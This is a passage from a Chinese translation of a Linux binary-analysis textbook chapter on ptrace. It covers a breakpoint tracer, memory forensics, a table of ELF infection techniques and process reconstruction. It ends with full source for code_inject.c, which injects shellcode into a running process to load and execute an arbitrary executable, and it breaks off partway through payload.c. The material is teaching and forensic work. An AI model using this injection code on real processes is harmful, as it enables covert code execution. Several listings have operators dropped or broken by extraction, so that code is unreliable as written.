%rdx: 7fff4accbf18
%rbx: 0
%rax: 400597
%rdi: 400644
%rsi: 7fff4accbf08
%r8: 7fd4f09efe80
%r9: 7fd4f0a05560
%r10: 7fff4accbcb0
%r11: 7fd4f0650dd0
%r12 400490
%r13 7fff4accbf00
%r14: 0
%r15: 0
%rsp: 7fff4accbe18
Please hit any key to continue: c
Hello 1
Executable ./test (pid: 6297) has hit breakpoint 0x40057d
%rcx: ffffffffffffffff
%rdx: 7fd4f09f09e0
%rbx: 0
%rax: 9
%rdi: 40064d
%rsi: 7fd4f0c14000
%r8: ffffffff
%r9: 0
%r10: 22
%r11: 246
%r12 400490
%r13 7fff4accbf00
%r14: 0
%r15: 0
%rsp: 7fff4accbe18
Hello 2
Please hit any key to continue: Completed tracing pid: 6297

```

正如你所看到的，`print_string`上设置了一个断点，每次调用该函数时，我们的`./tracer`程序都会捕获陷阱，打印寄存器值，然后在我们按下字符后继续执行。`./tracer`程序是`gdb`等调试器工作的一个很好的例子。虽然它要简单得多，但它演示了进程跟踪、断点和符号查找。

如果你想一次执行一个程序并跟踪它，这个程序效果很好。但是如果要跟踪一个已经运行的进程呢？在这种情况下，我们希望使用`PTRACE_ATTACH`附加到进程映像。这个请求发送一个`SIGSTOP`到我们附加的进程，所以我们使用`wait`或`waitpid`等待进程停止。

# 具有进程附加功能的简单 ptrace 调试器

让我们看一个代码示例：

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/mman.h>

typedef struct handle {
  Elf64_Ehdr *ehdr;
  Elf64_Phdr *phdr;
  Elf64_Shdr *shdr;
  uint8_t *mem;
  char *symname;
  Elf64_Addr symaddr;
  struct user_regs_struct pt_reg;
  char *exec;
} handle_t;

int global_pid;
Elf64_Addr lookup_symbol(handle_t *, const char *);
char * get_exe_name(int);
void sighandler(int);
#define EXE_MODE 0
#define PID_MODE 1

int main(int argc, char **argv, char **envp)
{
  int fd, c, mode = 0;
  handle_t h;
  struct stat st;
  long trap, orig;
  int status, pid;
  char * args[2];

    printf("Usage: %s [-ep <exe>/<pid>]
    [f <fname>]\n", argv[0]);

  memset(&h, 0, sizeof(handle_t));
  while ((c = getopt(argc, argv, "p:e:f:")) != -1)
  {
  switch(c) {
    case 'p':
    pid = atoi(optarg);
    h.exec = get_exe_name(pid);
    if (h.exec == NULL) {
      printf("Unable to retrieve executable path for pid: %d\n",
      pid);
      exit(-1);
    }
    mode = PID_MODE;
    break;
    case 'e':
    if ((h.exec = strdup(optarg)) == NULL) {
      perror("strdup");
      exit(-1);
    }
    mode = EXE_MODE;
    break;
    case 'f':
    if ((h.symname = strdup(optarg)) == NULL) {
      perror("strdup");
      exit(-1);
    }
    break;
    default:
    printf("Unknown option\n");
    break;
  }
}
if (h.symname == NULL) {
  printf("Specifying a function name with -f
  option is required\n");
  exit(-1);
}
if (mode == EXE_MODE) {
  args[0] = h.exec;
  args[1] = NULL;
}
signal(SIGINT, sighandler);
if ((fd = open(h.exec, O_RDONLY)) < 0) {
  perror("open");
  exit(-1);
}
if (fstat(fd, &st) < 0) {
  perror("fstat");
  exit(-1);
}
h.mem = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
if (h.mem == MAP_FAILED) {
  perror("mmap");
  exit(-1);
}
h.ehdr = (Elf64_Ehdr *)h.mem;
h.phdr = (Elf64_Phdr *)(h.mem + h.ehdr>
h.shdr = (Elf64_Shdr *)(h.mem + h.ehdr>

if (h.mem[0] != 0x7f &&!strcmp((char *)&h.mem[1], "ELF")) {
  printf("%s is not an ELF file\n",h.exec);
  exit(-1);
}
if (h.ehdr>e_type != ET_EXEC) {
  printf("%s is not an ELF executable\n", h.exec);
  exit(-1);
}
if (h.ehdr->e_shstrndx == 0 || h.ehdr->e_shoff == 0 || h.ehdr->e_shnum == 0) {
  printf("Section header table not found\n");
  exit(-1);
}
if ((h.symaddr = lookup_symbol(&h, h.symname)) == 0) {
  printf("Unable to find symbol: %s not found in executable\n", h.symname);
  exit(-1);
}
close(fd);
if (mode == EXE_MODE) {
  if ((pid = fork()) < 0) {
    perror("fork");
    exit(-1);
  }
  if (pid == 0) {
    if (ptrace(PTRACE_TRACEME, pid, NULL, NULL) < 0) {
      perror("PTRACE_TRACEME");
      exit(-1);
    }
    execve(h.exec, args, envp);
    exit(0);
  }
} else { // attach to the process 'pid'
  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
    perror("PTRACE_ATTACH");
    exit(-1);
  }
}
wait(&status); // wait tracee to stop
global_pid = pid;
printf("Beginning analysis of pid: %d at %lx\n", pid, h.symaddr);
// Read the 8 bytes at h.symaddr
if ((orig = ptrace(PTRACE_PEEKTEXT, pid, h.symaddr, NULL)) < 0) {
  perror("PTRACE_PEEKTEXT");
  exit(-1);
}

// set a break point
trap = (orig & ~0xff) | 0xcc;
if (ptrace(PTRACE_POKETEXT, pid, h.symaddr, trap) < 0) {
  perror("PTRACE_POKETEXT");
  exit(-1);
}
// Begin tracing execution
trace:
if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
  perror("PTRACE_CONT");
  exit(-1);
}
wait(&status);

/*
    * If we receive a SIGTRAP then we presumably hit a break
    * Point instruction. In which case we will print out the
    *current register state.
*/
if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
  if (ptrace(PTRACE_GETREGS, pid, NULL, &h.pt_reg) < 0) {
    perror("PTRACE_GETREGS");
    exit(-1);
  }
  printf("\nExecutable %s (pid: %d) has hit breakpoint 0x%lx\n", h.exec, pid, h.symaddr);
  printf("%%rcx: %llx\n%%rdx: %llx\n%%rbx: %llx\n"
  "%%rax: %llx\n%%rdi: %llx\n%%rsi: %llx\n"
  "%%r8: %llx\n%%r9: %llx\n%%r10: %llx\n"
  "%%r11: %llx\n%%r12 %llx\n%%r13 %llx\n"
  "%%r14: %llx\n%%r15: %llx\n%%rsp: %llx",
  h.pt_reg.rcx, h.pt_reg.rdx, h.pt_reg.rbx,
  h.pt_reg.rax, h.pt_reg.rdi, h.pt_reg.rsi,
  h.pt_reg.r8, h.pt_reg.r9, h.pt_reg.r10,
  h.pt_reg.r11, h.pt_reg.r12, h.pt_reg.r13,
  h.pt_reg.r14, h.pt_reg.r15, h.pt_reg.rsp);
  printf("\nPlease hit any key to continue: ");
  getchar();
  if (ptrace(PTRACE_POKETEXT, pid, h.symaddr, orig) < 0) {
    perror("PTRACE_POKETEXT");
    exit(-1);
  }
  h.pt_reg.rip = h.pt_reg.rip 1;
  if (ptrace(PTRACE_SETREGS, pid, NULL, &h.pt_reg) < 0) {
    perror("PTRACE_SETREGS");
  exit(-1);
  }
  if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0) {
    perror("PTRACE_SINGLESTEP");
    exit(-1);
  }
  wait(NULL);
  if (ptrace(PTRACE_POKETEXT, pid, h.symaddr, trap) < 0) {
    perror("PTRACE_POKETEXT");
    exit(-1);
  }
  goto trace;
}
if (WIFEXITED(status)){
  printf("Completed tracing pid: %d\n", pid);
  exit(0);
}

/* This function will lookup a symbol by name, specifically from
 * The .symtab section, and return the symbol value.
 */

Elf64_Addr lookup_symbol(handle_t *h, const char *symname)
{
  int i, j;
  char *strtab;
  Elf64_Sym *symtab;
  for (i = 0; i < h->ehdr->e_shnum; i++) {
    if (h->shdr[i].sh_type == SHT_SYMTAB) {
      strtab = (char *)
      &h->mem[h->shdr[h->shdr[i].sh_link].sh_offset];
      symtab = (Elf64_Sym *)
      &h->mem[h->shdr[i].sh_offset];
      for (j = 0; j < h>
      shdr[i].sh_size/sizeof(Elf64_Sym); j++) {
        if(strcmp(&strtab[symtab->st_name], symname) == 0)
        return (symtab->st_value);
        symtab++;
      }
    }
  }
  return 0;
}

/*
* This function will parse the cmdline proc entry to retrieve
* the executable name of the process.
*/
char * get_exe_name(int pid)
{
  char cmdline[255], path[512], *p;
  int fd;
  snprintf(cmdline, 255, "/proc/%d/cmdline", pid);
  if ((fd = open(cmdline, O_RDONLY)) < 0) {
    perror("open");
    exit(-1);
  }
  if (read(fd, path, 512) < 0) {
    perror("read");
    exit(-1);
  }
  if ((p = strdup(path)) == NULL) {
    perror("strdup");
    exit(-1);
  }
  return p;
}
void sighandler(int sig)
{
  printf("Caught SIGINT: Detaching from %d\n", global_pid);
  if (ptrace(PTRACE_DETACH, global_pid, NULL, NULL) < 0 && errno) {
    perror("PTRACE_DETACH");
    exit(-1);
  }
  exit(0);
}
```

使用`./tracer`（版本 2），我们现在可以附加到一个已经运行的进程，然后在所需的函数上设置一个断点，并跟踪执行。这是一个追踪一个程序的例子，该程序在循环中打印`Hello 1`字符串 20 次，使用`print_string(char *s);`：

```
ryan@elfmaster:~$ ./tracer -p `pidof ./test2` -f print_string
Beginning analysis of pid: 7075 at 4005bd
Executable ./test2 (pid: 7075) has hit breakpoint 0x4005bd
%rcx: ffffffffffffffff
%rdx: 0
%rbx: 0
%rax: 0
%rdi: 4006a4
%rsi: 7fffe93670e0
%r8: 7fffe93671f0
%r9: 0
%r10: 8
%r11: 246
%r12 4004d0
%r13 7fffe93673b0
%r14: 0
%r15: 0
%rsp: 7fffe93672b8
Please hit any key to continue: c
Executable ./test2 (pid: 7075) has hit breakpoint 0x4005bd
%rcx: ffffffffffffffff
%rdx: 0
%rbx: 0
%rax: 0
%rdi: 4006a4
%rsi: 7fffe93670e0
%r8: 7fffe93671f0
%r9: 0
%r10: 8
%r11: 246
%r12 4004d0
%r13 7fffe93673b0
%r14: 0
%r15: 0
%rsp: 7fffe93672b8
^C
Caught SIGINT: Detaching from 7452

```

因此，我们已经完成了简单调试软件的编码，它既可以执行程序并跟踪它，也可以附加到现有进程并跟踪它。这展示了`ptrace`最常见的用例，你编写的大多数使用`ptrace`的程序都将是对*tracer.c*代码技术的变化。

# 高级函数跟踪软件

2013 年，我设计了一个跟踪函数调用的工具。它与`strace`和`ltrace`非常相似，但它跟踪的不是`syscalls`或库调用，而是跟踪可执行文件中的每个函数调用。这个工具在第二章中有介绍，*ELF 二进制格式*，但它与`ptrace`的主题非常相关。这是因为它完全依赖于`ptrace`，并使用控制流监视执行一些非常狂野的动态分析。源代码可以在 GitHub 上找到：

[`github.com/leviathansecurity/ftrace`](https://github.com/leviathansecurity/ftrace)

# ptrace 和取证分析

`ptrace()`命令是最常用于用户空间内存分析的系统调用。实际上，如果你正在设计运行在用户空间的取证软件，它访问其他进程的内存的唯一方式是通过`ptrace`系统调用，或者通过读取`proc`文件系统（当然，除非程序有某种显式的共享内存 IPC 设置）。

### 注意

一个可以附加到进程，然后作为`ptrace`读/写语义的替代方案`open/lseek/read/write /proc/<pid>/mem`。

2011 年，我获得了 DARPA CFT（网络快速跟踪）计划的合同，设计了一个名为*Linux VMA Monitor*的东西。这个软件的目的是检测各种已知和未知的进程内存感染，如 rootkits 和内存驻留病毒。

它基本上使用特殊的启发式方法对每个进程地址空间执行自动智能内存取证分析，了解`ELF`执行。它可以发现异常或寄生体，如劫持函数和通用代码感染。该软件可以分析活动内存并作为主机入侵检测系统运行，或者对进程内存进行快照并对其进行分析。该软件还可以检测和清除磁盘上感染病毒的`ELF`二进制文件。

`ptrace`系统调用在软件中被大量使用，并展示了围绕`ELF`二进制和`ELF`运行时感染的许多有趣代码。我还没有发布源代码，因为我打算在发布之前提供一个更适合生产的版本。在本文中，我们将涵盖*Linux VMA Monitor*可以检测/清除的几乎所有感染类型，并讨论和演示用于识别这些感染的启发式方法。

十多年来，黑客一直在进程内存中隐藏复杂的恶意软件以保持隐蔽。这可能是共享库注入和 GOT 污染的组合，或者任何其他一组技术。系统管理员发现这些的机会非常渺茫，特别是因为公开可用于检测这些攻击的软件并不多。

我发布了几个工具，包括但不限于 AVU 和 ECFS，它们都可以在 GitHub 和我的网站[`bitlackeys.org/`](http://bitlackeys.org/)上找到。其他存在的用于此类事物的软件都是高度专业化并且私下使用，或者根本不存在。与此同时，一位优秀的取证分析师可以使用调试器或编写自定义软件来检测此类恶意软件，了解你要寻找的内容以及原因是很重要的。由于本章节主要讨论 ptrace，我想强调它与取证分析的相关性。尤其是对于那些对设计专门用于在内存中识别威胁的软件感兴趣的人。

在本章末尾，我们将看到如何编写程序来检测运行软件中的函数跳板。

## 在内存中寻找什么

`ELF`可执行文件在内存中几乎与磁盘上的相同，除了对数据段变量、全局偏移表、函数指针和未初始化变量（`.bss`部分）的更改。

这意味着在`ELF`二进制文件中使用的许多病毒或 rootkit 技术也可以应用于进程（运行时代码），因此对于攻击者来说更好地保持隐藏。我们将在整本书中深入讨论所有这些常见的感染向量，但以下是一些已被用于实现感染代码的技术列表：

| 感染技术 | 预期结果 | 驻留类型 |
| --- | --- | --- |
| GOT 感染 | 劫持共享库函数 | 进程内存或可执行文件 |
| **过程链接表**（**PLT**）感染 | 劫持共享库函数 | 进程内存或可执行文件 |
| `.ctors`/`.dtors`函数指针修改 | 改变到恶意代码的控制流 | 进程内存或可执行文件 |
| 函数跳板 | 劫持任何函数 | 进程内存或可执行文件 |
| 共享库注入 | 插入恶意代码 | 进程内存或可执行文件 |
| 可重定位代码注入 | 插入恶意代码 | 进程内存或可执行文件 |
| 对文本段的直接修改 | 插入恶意代码 | 进程内存或可执行文件 |
| 进程占有（将整个程序注入地址空间） | 在现有进程中隐藏运行完全不同的可执行程序 | 进程内存 |

使用`ELF`格式解析、`/proc/<pid>/maps`和`ptrace`的组合，可以创建一组启发式方法来检测前述技术中的每一种，并创建一个反方法来清除所谓的寄生代码。我们将在整本书中深入探讨所有这些技术，主要是在第四章和第六章。

# 进程映像重构 – 从内存到可执行文件

测试我们对`ELF`格式和`ptrace`的能力的一个很好的练习是设计软件，可以将进程映像重构为可工作的可执行文件。这对于我们在系统上发现可疑程序运行的类型的取证工作特别有用。**扩展核心文件快照**（**ECFS**）技术能够做到这一点，并将功能扩展到与传统 Linux 核心文件格式向后兼容的创新取证和调试格式。这在[`github.com/elfmaster/ecfs`](https://github.com/elfmaster/ecfs)上可用，并在本书的第八章中有进一步的文档，*ECFS – 扩展核心文件快照技术*。Quenya 也具有这个功能，并可以在[`www.bitlackeys.org/projects/quenya_32bit.tgz`](http://www.bitlackeys.org/projects/quenya_32bit.tgz)上下载。

## 进程可执行文件重构的挑战

为了将进程重构为可执行文件，我们必须首先考虑所涉及的挑战，因为有很多事情需要考虑。有一种特定类型的变量是我们无法控制的，这些是初始化数据中的全局变量。它们可能在运行时已经改变为代码所规定的变量，我们无法知道它们在运行之前应该被初始化为什么。我们甚至可能无法通过静态代码分析找到这一点。

以下是可执行文件重构的目标：

+   以进程 ID 作为参数，并将该进程映像重构为其可执行文件状态

+   我们应该构建一个最小的段头表，以便程序可以通过`objdump`和`gdb`等工具进行更准确的分析

## 可执行文件重构的挑战

完整的可执行文件重构是可能的，但在重构动态链接的可执行文件时会带来一些挑战。在这里，我们将讨论主要的挑战是什么，以及每个挑战的一般解决方案是什么。

### PLT/GOT 完整性

全局偏移表将填入相应共享库函数的解析值。当然，这是由动态链接器完成的，因此我们必须用原始的 PLT 存根地址替换这些地址。我们这样做是为了当共享库函数第一次被调用时，它们通过将 GOT 偏移推送到堆栈的 PLT 指令正确地触发动态链接器。参考本书的第二章中的*ELF 和动态链接*部分，*ELF 二进制格式*。

以下图表演示了 GOT 条目如何被恢复：

![PLT/GOT 完整性](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00004.jpeg)

## 添加一个段头表

请记住，程序的段头表在运行时不会加载到内存中。这是因为它不需要。在将进程图像重构回可执行文件时，添加段头表是可取的（尽管不是必需的）。完全可以添加原始可执行文件中的每个段头条目，但是一个优秀的`ELF`黑客至少可以生成基本内容。

因此，请尝试为以下部分创建一个段头：`.interp`、`.note`、`.text`、`.dynamic`、`.got.plt`、`.data`、`.bss`、`.shstrtab`、`.dynsym`和`.dynstr`。

### 注意

如果您正在重构的可执行文件是静态链接的，那么您将不会有`.dynamic`、`.got.plt`、`.dynsym`或`.dynstr`部分。

## 进程的算法

让我们来看看可执行文件的重构：

1.  定位可执行文件（文本段）的基地址。这可以通过解析`/proc/<pid>/maps`来完成：

```
[First line of output from /proc/<pid>/maps file for program 'evil']

00400000-401000 r-xp /home/ryan/evil

```

### 提示

使用`ptrace`的`PTRACE_PEEKTEXT`请求来读取整个文本段。您可以在前面的映射输出中看到文本段的地址范围（标记为`r-xp`）是`0x400000`到`0x401000`，即 4096 字节。因此，这就是文本段的缓冲区大小。由于我们还没有涵盖如何使用`PTRACE_PEEKTEXT`一次读取超过一个长字大小的字，我编写了一个名为`pid_read()`的函数，演示了一个很好的方法。

```
[Source code for pid_read() function]
int pid_read(int pid, void *dst, const void *src, size_t len)
{
  int sz = len / sizeof(void *);
  unsigned char *s = (unsigned char *)src;
  unsigned char *d = (unsigned char *)dst;
  unsigned long word;
  while (sz!=0) {
    word = ptrace(PTRACE_PEEKTEXT, pid, (long *)s, NULL);
    if (word == 1)
    return 1;
    *(long *)d = word;
    s += sizeof(long);
    d += sizeof(long);
  }
  return 0;
}
```

1.  解析`ELF`文件头（例如`Elf64_Ehdr`）以定位程序头表：

```
/* Where buffer is the buffer holding the text segment */
Elf64_Ehdr *ehdr = (Elf64_Ehdr *)buffer;
Elf64_Phdr *phdr = (Elf64_Phdr *)&buffer[ehdr->e_phoff];
```

1.  然后解析程序头表以找到数据段：

```
for (c = 0; c < ehdr>e_phnum; c++)
if (phdr[c].p_type == PT_LOAD && phdr[c].p_offset) {
  dataVaddr = phdr[c].p_vaddr;
  dataSize = phdr[c].p_memsz;
  break;
}
pid_read(pid, databuff, dataVaddr, dataSize);
```

1.  将数据段读入缓冲区，并在其中定位动态段，然后定位 GOT。使用动态段中的`d_tag`来定位 GOT：

### 注意

我们在第二章的*ELF 二进制格式*部分讨论了动态段及其标记值。

```
Elf64_Dyn *dyn;
for (c = 0; c < ehdr->e_phnum; c++) {
  if (phdr[c].p_type == PT_DYNAMIC) {
    dyn = (Elf64_Dyn *)&databuff[phdr[c].p_vaddr – dataAddr];
    break;
  }
  if (dyn) {
    for (c = 0; dyn[c].d_tag != DT_NULL; c++) {
      switch(dyn[c].d_tag) {
        case DT_PLTGOT:
        gotAddr = dyn[i].d_un.d_ptr;
        break;
        case DT_STRTAB:
        /* Get .dynstr info */
        break;
        case DT_SYMTAB:
        /* Get .dynsym info */
        break;
      }
    }
  }
```

1.  一旦找到 GOT，就必须将其恢复到运行时之前的状态。最重要的部分是恢复每个 GOT 条目中原始的 PLT 存根地址，以便懒惰链接在程序运行时起作用。参见第二章的*ELF 动态链接*部分，*ELF 二进制格式*：

```
00000000004003e0 <puts@plt>:
4003e0: ff 25 32 0c 20 00 jmpq *0x200c32(%rip) # 601018 
4003e6: 68 00 00 00 00 pushq $0x0
4003eb: e9 e0 ff ff ff jmpq 4003d0 <_init+0x28>

```

1.  为`puts()`保留的 GOT 条目应该被修补，指向将 GOT 偏移推送到堆栈的 PLT 存根代码。前面的命令中给出了这个地址`0x4003e6`。确定 GOT 到 PLT 条目关系的方法留给读者作为练习。

1.  可选地重构一个段头表。然后将文本段和数据段（以及段头表）写入磁盘。

## 在 32 位测试环境上使用 Quenya 进行进程重构

一个名为`dumpme`的 32 位`ELF`可执行文件简单地打印`You can Dump my segments!`字符串，然后暂停，让我们有时间重构它。

现在，以下代码演示了 Quenya 将进程图像重构为可执行文件：

```
[Quenya v0.1@ELFWorkshop]
rebuild 2497 dumpme.out
[+] Beginning analysis for executable reconstruction of process image (pid: 2497)
[+] Getting Loadable segment info...
[+] Found loadable segments: text segment, data segment
Located PLT GOT Vaddr 0x804a000
Relevant GOT entries begin at 0x804a00c
[+] Resolved PLT: 0x8048336
PLT Entries: 5
Patch #1 [
0xb75f7040] changed to [0x8048346]
Patch #2 [
0xb75a7190] changed to [0x8048356]
Patch #3 [
0x8048366] changed to [0x8048366]
Patch #4 [
0xb755a990] changed to [0x8048376]
[+] Patched GOT with PLT stubs
Successfully rebuilt ELF object from memory
Output executable location: dumpme.out
[Quenya v0.1@ELFWorkshop]
quit
```

在这里，我们演示了输出可执行文件是否正确运行：

```
hacker@ELFWorkshop:~/
workshop/labs/exercise_9$ ./dumpme.out
You can Dump my segments!

```

Quenya 还为可执行文件创建了一个最小的段头表：

```
hacker@ELFWorkshop:~/
workshop/labs/exercise_9$ readelf -S
dumpme.out

```

这里显示了从偏移量`0x1118`开始的七个段头。

![Quenya 在 32 位测试环境上进行进程重构](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00005.jpeg)

Quenya 中用于进程重构的源代码主要位于`rebuild.c`中，Quenya 可以从我的网站[`www.bitlackeys.org/`](http://www.bitlackeys.org/)下载。

# 使用 ptrace 进行代码注入

到目前为止，我们已经研究了一些有趣的`ptrace`用例，包括进程分析和进程镜像重建。`ptrace`的另一个常见用途是向运行中的进程引入新代码并执行它。攻击者通常这样做是为了修改运行中的程序，使其执行其他操作，比如将恶意共享库加载到进程地址空间中。

在 Linux 中，默认的`ptrace()`行为是允许你写入`Using PTRACE_POKETEXT`到不可写的段，比如文本段。这是因为预期调试器需要在代码中插入断点。这对于想要将代码插入内存并执行的黑客来说非常有用。为了演示这一点，我们编写了`code_inject.c`。它附加到一个进程并注入一个 shellcode，将创建一个足够大的匿名内存映射来容纳我们的 payload 可执行文件`payload.c`，然后将其注入到新的内存中并执行。

### 注意

在本章前面提到过，使用`PaX`打补丁的 Linux 内核将不允许`ptrace()`写入不可写的段。这是为了进一步执行内存保护限制。在论文《通过 GOT 污染进行 ELF 运行时感染》中，我已经讨论了通过使用`ptrace`操纵`vsyscall`表来绕过这些限制的方法。

现在，让我们看一个代码示例，我们在运行中的进程中注入一个 shellcode，加载一个外部可执行文件：

```
To compile: gcc code_inject.c o code_inject
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE 1))
#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE)
#define WORD_ALIGN(x) ((x + 7) & ~7)
#define BASE_ADDRESS 0x00100000
typedef struct handle {
  Elf64_Ehdr *ehdr;
  Elf64_Phdr *phdr;
  Elf64_Shdr *shdr;
  uint8_t *mem;
  pid_t pid;
  uint8_t *shellcode;
  char *exec_path;
  uint64_t base;
  uint64_t stack;
  uint64_t entry;
  struct user_regs_struct pt_reg;
} handle_t;

static inline volatile void *
evil_mmap(void *, uint64_t, uint64_t, uint64_t, int64_t, uint64_t)
__attribute__((aligned(8),__always_inline__));
uint64_t injection_code(void *) __attribute__((aligned(8)));
uint64_t get_text_base(pid_t);
int pid_write(int, void *, const void *, size_t);
uint8_t *create_fn_shellcode(void (*fn)(), size_t len);

void *f1 = injection_code;
void *f2 = get_text_base;

static inline volatile long evil_write(long fd, char *buf, unsigned long len)
{
  long ret;
  __asm__ volatile(
    "mov %0, %%rdi\n"
    "mov %1, %%rsi\n"
    "mov %2, %%rdx\n"
    "mov $1, %%rax\n"
    "syscall" : : "g"(fd), "g"(buf), "g"(len));
  asm("mov %%rax, %0" : "=r"(ret));
  return ret;
}

static inline volatile int evil_fstat(long fd, struct stat *buf)
{
  long ret;
  __asm__ volatile(
    "mov %0, %%rdi\n"
    "mov %1, %%rsi\n"
    "mov $5, %%rax\n"
    "syscall" : : "g"(fd), "g"(buf));
  asm("mov %%rax, %0" : "=r"(ret));
  return ret;
}

static inline volatile int evil_open(const char *path, unsigned long flags)
{
  long ret;
  __asm__ volatile(
    "mov %0, %%rdi\n"
    "mov %1, %%rsi\n"
    "mov $2, %%rax\n"
    "syscall" : : "g"(path), "g"(flags));
    asm ("mov %%rax, %0" : "=r"(ret));
  return ret;
}

static inline volatile void * evil_mmap(void *addr, uint64_t len, uint64_t prot, uint64_t flags, int64_t fd, uint64_t off)
{
  long mmap_fd = fd;
  unsigned long mmap_off = off;
  unsigned long mmap_flags = flags;
  unsigned long ret;
  __asm__ volatile(
    "mov %0, %%rdi\n"
    "mov %1, %%rsi\n"
    "mov %2, %%rdx\n"
    "mov %3, %%r10\n"
    "mov %4, %%r8\n"
    "mov %5, %%r9\n"
    "mov $9, %%rax\n"
    "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags),
    "g"(mmap_fd), "g"(mmap_off));
  asm ("mov %%rax, %0" : "=r"(ret));
  return (void *)ret;
}

uint64_t injection_code(void * vaddr)
{
  volatile void *mem;
  mem = evil_mmap(vaddr,8192,
  PROT_READ|PROT_WRITE|PROT_EXEC,
  MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,1,0);
  __asm__ __volatile__("int3");
}

#define MAX_PATH 512

uint64_t get_text_base(pid_t pid)
{
  char maps[MAX_PATH], line[256];
  char *start, *p;
  FILE *fd;
  int i;
  Elf64_Addr base;
  snprintf(maps, MAX_PATH 1,
  "/proc/%d/maps", pid);
  if ((fd = fopen(maps, "r")) == NULL) {
    fprintf(stderr, "Cannot open %s for reading: %s\n", maps, strerror(errno));
    return 1;
  }
  while (fgets(line, sizeof(line), fd)) {
    if (!strstr(line, "rxp"))
    continue;
    for (i = 0, start = alloca(32), p = line; *p != ''; i++, p++)
    start[i] = *p;

    start[i] = '\0';
    base = strtoul(start, NULL, 16);
    break;
  }
  fclose(fd);
  return base;
}

uint8_t * create_fn_shellcode(void (*fn)(), size_t len)
{
  size_t i;
  uint8_t *shellcode = (uint8_t *)malloc(len);
  uint8_t *p = (uint8_t *)fn;
  for (i = 0; i < len; i++)
  *(shellcode + i) = *p++;
  return shellcode;
}

int pid_read(int pid, void *dst, const void *src, size_t len)
{
  int sz = len / sizeof(void *);
  unsigned char *s = (unsigned char *)src;
  unsigned char *d = (unsigned char *)dst;
  long word;
  while (sz!=0) {
    word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
    if (word == 1 && errno) {
      fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid,strerror(errno));
      goto fail;
    }
    *(long *)d = word;
    s += sizeof(long);
    d += sizeof(long);
  }
  return 0;
  fail:
  perror("PTRACE_PEEKTEXT");
  return 1;
}

int pid_write(int pid, void *dest, const void *src, size_t len)
{
  size_t quot = len / sizeof(void *);
  unsigned char *s = (unsigned char *) src;
  unsigned char *d = (unsigned char *) dest;
  while (quot!= 0) {
    if ( ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == 1)
    goto out_error;
    s += sizeof(void *);
    d += sizeof(void *);
  }
  return 0;
  out_error:
  perror("PTRACE_POKETEXT");
  return 1;
}

int main(int argc, char **argv)
{
  handle_t h;
  unsigned long shellcode_size = f2 f1;
  int i, fd, status;
  uint8_t *executable, *origcode;
  struct stat st;
  Elf64_Ehdr *ehdr;
  if (argc < 3) {
    printf("Usage: %s <pid> <executable>\n", argv[0]);
    exit(1);
  }
  h.pid = atoi(argv[1]);
  h.exec_path = strdup(argv[2]);
  if (ptrace(PTRACE_ATTACH, h.pid) < 0) {
    perror("PTRACE_ATTACH");
    exit(1);
  }
  wait(NULL);
  h.base = get_text_base(h.pid);
  shellcode_size += 8;
  h.shellcode = create_fn_shellcode((void *)&injection_code, shellcode_size);
  origcode = alloca(shellcode_size);
  if (pid_read(h.pid, (void *)origcode, (void *)h.base, shellcode_size) < 0)
  exit(1);
  if (pid_write(h.pid, (void *)h.base, (void *)h.shellcode, shellcode_size) < 0)
  exit(1);
  if (ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0) {
    perror("PTRACE_GETREGS");
    exit(1);
  }
  h.pt_reg.rip = h.base;
  h.pt_reg.rdi = BASE_ADDRESS;
  if (ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0) {
    perror("PTRACE_SETREGS");
    exit(1);
  }
  if (ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0) {
    perror("PTRACE_CONT");
    exit(1);
  }
  wait(&status);
  if (WSTOPSIG(status) != SIGTRAP) {
    printf("Something went wrong\n");
    exit(1);
  }
  if (pid_write(h.pid, (void *)h.base, (void *)origcode, shellcode_size) < 0)
  exit(1);
  if ((fd = open(h.exec_path, O_RDONLY)) < 0) {
    perror("open");
    exit(1);
  }
  if (fstat(fd, &st) < 0) {
    perror("fstat");
    exit(1);
  }
  executable = malloc(WORD_ALIGN(st.st_size));
  if (read(fd, executable, st.st_size) < 0) {
    perror("read");
    exit(1);
  }
  ehdr = (Elf64_Ehdr *)executable;
  h.entry = ehdr->e_entry;
  close(fd);
  if (pid_write(h.pid, (void *)BASE_ADDRESS, (void *)executable, st.st_size) < 0)
  exit(1);
  if (ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0) {
    perror("PTRACE_GETREGS");
    exit(1);
  }
  h.entry = BASE_ADDRESS + h.entry;
  h.pt_reg.rip = h.entry;
  if (ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0) {
    perror("PTRACE_SETREGS");
    exit(1);
  }
  if (ptrace(PTRACE_DETACH, h.pid, NULL, NULL) < 0) {
    perror("PTRACE_CONT");
    exit(1);
  }
  wait(NULL);
  exit(0);
}
```

以下是`payload.c`的源代码。它是在不链接`libc`并且使用位置无关代码的情况下编译的：

```
To Compile: gcc -fpic -pie -nostdlib payload.c -o payload

long _write(long fd, char *buf, unsigned long len)
{
  long ret;
  __asm__ volatile(
    "mov %0, %%rdi\n"
    "mov %1, %%rsi\n"
